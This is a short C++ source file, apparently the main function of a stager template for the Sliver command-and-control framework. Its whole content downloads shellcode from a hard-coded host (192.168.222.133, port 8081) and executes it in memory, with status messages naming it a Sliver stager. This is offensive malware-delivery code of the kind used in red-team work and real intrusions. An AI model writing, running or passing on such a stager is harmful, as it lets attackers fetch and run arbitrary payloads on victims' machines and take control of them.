#include "ShellcodeLoader.h"

int main()
{
    printf("[*] Sliver CPP Stager template\n");

    ShellcodeLoader loader;
    ShellCode shellcode = loader.Download(L"192.168.222.133", 8081);

    loader.ExecuteShellcode(shellcode);

    delete[] shellcode.data;

    printf("[*] Sliver Stager executed \n");
}
